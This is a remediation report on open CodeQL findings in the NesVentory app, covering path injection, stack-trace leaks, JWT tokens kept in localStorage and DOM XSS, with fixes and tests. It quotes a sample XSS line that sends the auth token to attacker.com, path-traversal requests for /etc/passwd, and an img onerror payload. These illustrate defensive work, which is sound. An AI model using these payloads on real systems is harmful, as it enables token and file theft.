# CodeQL Security Code Scanning Review - Current Open Issues

**Repository:** tokendad/NesVentory

**Review Date:** February 1, 2026

**Status:** ✅ 33 issues FIXED/DISMISSED | 🔴 10 issues OPEN

---

## Current Open Issues Summary

| Issue # | Type | Severity | File | Line |
|---------|------|----------|------|------|
| #51 | py/stack-trace-exposure | 🔴 ERROR | backend/app/routers/printer.py | 592 |
| #50 | py/stack-trace-exposure | 🔴 ERROR | backend/app/routers/printer.py | 523 |
| #49 | py/path-injection | 🔴 ERROR | backend/app/thumbnails.py | 56 |
| #48 | py/path-injection | 🔴 ERROR | backend/app/thumbnails.py | 54 |
| #47 | py/path-injection | 🔴 ERROR | backend/app/routers/logs.py | 313 |
| #44 | py/stack-trace-exposure | 🔴 ERROR | backend/app/routers/printer.py | 454 |
| #40 | js/xss-through-dom | 🟡 WARNING | src/components/ItemDetails.tsx | 670 |
| #35 | js/clear-text-storage-of-sensitive-data | 🔴 ERROR | src/App.tsx | 293 |
| #18 | py/path-injection | 🔴 ERROR | backend/app/routers/logs.py | 311 |
| #17 | py/path-injection | 🔴 ERROR | backend/app/routers/logs.py | 311 |

---

## Issues by Type

### Path Injection (5 issues) - 🔴 CRITICAL

**Issues:** #17, #18, #47, #48, #49

**Affected Files:**
- `backend/app/routers/logs.py` (Lines 311, 313)
- `backend/app/thumbnails.py` (Lines 54, 56)

**Risk Level:** CRITICAL - Allows arbitrary file access on server

**Details:**
User-controlled input is used to construct file paths without validation, allowing directory traversal attacks (e.g., `/../../../etc/passwd`).

**Fix Required:**
- Implement path validation with whitelisting
- Use pathlib to prevent traversal
- Validate all filename inputs

---

### Stack Trace Exposure (3 issues) - 🔴 HIGH

**Issues:** #44, #50, #51

**Affected File:**
- `backend/app/routers/printer.py` (Lines 454, 523, 592)

**Risk Level:** HIGH - Exposes internal implementation details

**Details:**
Exception messages and stack traces are returned to users, revealing:
- Internal file paths
- Server structure
- Configuration details
- Database information

**Fix Required:**
- Return generic error messages to clients
- Log full exceptions server-side
- Add error codes for debugging

---

### Clear Text Storage of Sensitive Data (1 issue) - 🔴 CRITICAL

**Issue:** #35

**Affected File:**
- `src/App.tsx` (Line 293)

**Risk Level:** CRITICAL - JWT token theft via XSS

**Details:**
JWT authentication tokens are stored in browser localStorage in plain text. Any XSS vulnerability can steal the token:

```javascript
// Attacker injects this via XSS
fetch('https://attacker.com/steal?token=' + localStorage.getItem('auth_token'))
```

**Fix Required:**
- Move tokens to HttpOnly cookies
- Remove localStorage usage
- Implement secure session management

---

### XSS Through DOM (1 issue) - 🟡 MEDIUM

**Issue:** #40

**Affected File:**
- `src/components/ItemDetails.tsx` (Line 670)

**Risk Level:** MEDIUM - JavaScript injection

**Details:**
User input is directly inserted into DOM using `innerHTML` without sanitization, allowing XSS attacks.

**Fix Required:**
- Use `textContent` instead of `innerHTML`
- Use React rendering (automatic escaping)
- Sanitize user input if HTML needed

---

## Priority Fixes

### 🔴 PHASE 1: CRITICAL (Address Immediately)

**Issues to Fix:** #35, #17, #18, #47, #48, #49

**Effort:** ~3-4 hours

**Steps:**

1. **JWT Token Storage (#35)** - 30 minutes
   - Move to HttpOnly cookies in backend
   - Update frontend API client
   - Remove localStorage references

2. **Path Injection (#17, #18, #47, #48, #49)** - 2-3 hours
   - Create path validation helper
   - Fix `logs.py` file access (2 issues)
   - Fix `thumbnails.py` thumbnail generation (2 issues)
   - Add unit tests

### 🔴 PHASE 2: HIGH (Within 1 week)

**Issues to Fix:** #44, #50, #51

**Effort:** ~1 hour

**Steps:**

1. **Stack Trace Exposure (#44, #50, #51)** - 1 hour
   - Create error handler wrapper
   - Return generic messages
   - Log full details server-side

### 🟡 PHASE 3: MEDIUM (Within 2 weeks)

**Issues to Fix:** #40

**Effort:** ~30 minutes

**Steps:**

1. **XSS in ItemDetails (#40)** - 30 minutes
   - Audit DOM manipulation
   - Replace innerHTML with textContent/React rendering

---

## Recommended Fixes by File

### 1. backend/app/routers/logs.py (Issues #17, #18, #47)

**Current Code (Vulnerable):**
```python
@router.get("/logs/{filename}")
async def get_log(filename: str):
    log_file = os.path.join(LOG_DIR, filename)
    with open(log_file, 'r') as f:
        return f.read()

# Attack: GET /logs/../../../etc/passwd
```

**Fixed Code:**
```python
ALLOWED_LOGS = {"app.log", "error.log", "access.log", "debug.log"}

@router.get("/logs/{filename}")
async def get_log(filename: str):
    # Validate filename is in whitelist
    if filename not in ALLOWED_LOGS:
        raise HTTPException(status_code=400, detail="Invalid log file")

    # Safe path construction
    log_file = Path(LOG_DIR) / filename

    # Verify resolved path is within LOG_DIR
    try:
        log_file.resolve().relative_to(Path(LOG_DIR).resolve())
    except ValueError:
        raise HTTPException(status_code=400, detail="Invalid path")

    if not log_file.exists():
        raise HTTPException(status_code=404, detail="Log not found")

    return log_file.read_text()
```

---

### 2. backend/app/thumbnails.py (Issues #48, #49)

**Current Code (Vulnerable):**
```python
def generate_thumbnail(file_path: str):
    thumb_path = os.path.join(THUMB_DIR, file_path)
    # Could be /tmp/thumbs/../../../../etc/passwd
```

**Fixed Code:**
```python
from pathlib import Path

def generate_thumbnail(file_id: str):
    """Generate thumbnail using file ID (not path)"""
    # Use UUID/ID instead of filename
    file_record = db.query(File).filter(File.id == file_id).first()
    if not file_record:
        raise ValueError("File not found")

    source_path = Path(file_record.storage_path)

    # Verify source is in media directory
    try:
        source_path.resolve().relative_to(Path(MEDIA_DIR).resolve())
    except ValueError:
        raise ValueError("Invalid file path")

    thumb_path = Path(THUMB_DIR) / f"{file_id}.jpg"
    # Generate thumbnail...
```

---

### 3. backend/app/routers/printer.py (Issues #44, #50, #51)

**Current Code (Vulnerable):**
```python
@router.post("/print-label")
async def print_label(request: PrintRequest):
    try:
        result = printer_service.print(request.label_image)
        return result
    except Exception as e:
        return {"error": str(e)}  # Exposes internal details
        # Error: "FileNotFoundError: /dev/ttyUSB0"
```

**Fixed Code:**
```python
import logging
logger = logging.getLogger(__name__)

@router.post("/print-label")
async def print_label(request: PrintRequest):
    try:
        result = printer_service.print(request.label_image)
        return result
    except Exception as e:
        # Log full exception server-side
        logger.error(f"Print failed", exc_info=True)

        # Return generic error to client
        return {
            "error": "Failed to print label. Please try again.",
            "error_code": "PRINT_ERROR"
        }
```

---

### 4. src/App.tsx (Issue #35)

**Current Code (Vulnerable):**
```typescript
const token = localStorage.getItem('auth_token');
// Exposed to XSS attacks
```

**Fixed Code (Option 1: HttpOnly Cookies - RECOMMENDED):**

**Backend:**
```python
from fastapi.responses import Response

@router.post("/login")
async def login(credentials: LoginRequest):
    token = create_access_token(credentials)

    response = JSONResponse({"success": True})
    response.set_cookie(
        "auth_token",
        token,
        httponly=True,      # JavaScript cannot access
        secure=True,        # HTTPS only
        samesite="strict",  # CSRF protection
        max_age=3600        # 1 hour expiry
    )
    return response
```

**Frontend:**
```typescript
// Remove localStorage usage
// Cookies are automatically sent with requests
// No need to manually attach token

// For logout:
async function logout() {
    await fetch('/api/logout', { method: 'POST' })
    // Server will clear the cookie
}
```

**Fixed Code (Option 2: In-Memory Storage):**
```typescript
let authToken: string | null = null;

function setToken(token: string) {
    authToken = token;
}

function getToken(): string | null {
    return authToken;
}

// Token is lost on page refresh - implement re-auth
// or use sessionStorage as backup
```

---

### 5. src/components/ItemDetails.tsx (Issue #40)

**Current Code (Vulnerable):**
```typescript
// Line 670
const name = item.name;
element.innerHTML = name;  // XSS vulnerability
// Attack: name = "<img src=x onerror='alert(1)'>"
```

**Fixed Code (Option 1: textContent):**
```typescript
const name = item.name;
element.textContent = name;  // Safe - no HTML execution
```

**Fixed Code (Option 2: React Rendering):**
```typescript
return (
    <div className="item-details">
        <h1>{item.name}</h1>  {/* Automatically escaped */}
        <p>{item.description}</p>
    </div>
);
```

---

## Testing Strategy

### Security Testing for Each Fix

**Path Injection Testing:**
```bash
# Test with traversal payloads
curl http://localhost:8181/api/logs/../../../etc/passwd
curl http://localhost:8181/api/logs/app.log/..
curl http://localhost:8181/api/logs/app.log%2f..
```

**Expected Result:** 400 Bad Request or 404 Not Found (NOT file contents)

**Stack Trace Testing:**
```bash
# Test error endpoints
curl http://localhost:8181/api/printer/print-label \
  -X POST \
  -d '{"invalid": "data"}'
```

**Expected Result:** Generic error message (NOT stack trace)

**Token Storage Testing:**
```javascript
// Check for HttpOnly flag
console.log(document.cookie);  // Should NOT contain auth_token

// Check console - no localStorage token
console.log(localStorage.getItem('auth_token'));  // Should be null
```

**XSS Testing:**
```javascript
// Try XSS payload
itemName = '<img src=x onerror="alert(1)">'
// Should render as text, not execute script
```

---

## Security Best Practices to Implement

### Add Security Headers

```python
@app.middleware("http")
async def add_security_headers(request, call_next):
    response = await call_next(request)

    # Prevent XSS
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"

    # Strict CSP
    response.headers["Content-Security-Policy"] = (
        "default-src 'self'; "
        "script-src 'self'; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data: https:; "
        "connect-src 'self'; "
        "form-action 'self';"
    )

    # HTTPS enforcement
    response.headers["Strict-Transport-Security"] = (
        "max-age=31536000; includeSubDomains"
    )

    return response
```

### Input Validation

```python
from pathlib import Path
import re

def validate_filename(filename: str) -> bool:
    """Validate filename is safe"""
    # Block path traversal attempts
    if '..' in filename or filename.startswith('/'):
        return False

    # Only allow alphanumeric, dash, underscore, dot
    if not re.match(r'^[a-zA-Z0-9._-]+$', filename):
        return False

    return True
```

---

## Implementation Checklist

- [ ] **Issue #35** - Move JWT to HttpOnly cookies
- [ ] **Issue #17** - Validate logs.py filename (line 311)
- [ ] **Issue #18** - Validate logs.py filename (line 311 - duplicate)
- [ ] **Issue #47** - Validate logs.py parameter (line 313)
- [ ] **Issue #48** - Validate thumbnails.py path (line 54)
- [ ] **Issue #49** - Validate thumbnails.py path (line 56)
- [ ] **Issue #44** - Generic error message printer.py (line 454)
- [ ] **Issue #50** - Generic error message printer.py (line 523)
- [ ] **Issue #51** - Generic error message printer.py (line 592)
- [ ] **Issue #40** - Use textContent in ItemDetails.tsx (line 670)
- [ ] Add security headers middleware
- [ ] Run CodeQL scan to verify fixes
- [ ] Update security documentation

---

## Summary

**Current Status:** 10 OPEN Issues | 33 FIXED/DISMISSED

**Recommendation:** Fix all CRITICAL issues (Phase 1) immediately before next release.

**Estimated Total Effort:** 4-5 hours

**Risk if Not Fixed:** Data breach, unauthorized file access, XSS attacks, token theft

---

**Next Steps:**
1. Create GitHub issues for tracking
2. Assign to developers
3. Implement Phase 1 fixes (1-2 days)
4. Test fixes thoroughly
5. Re-run CodeQL scan
6. Verify all issues resolved
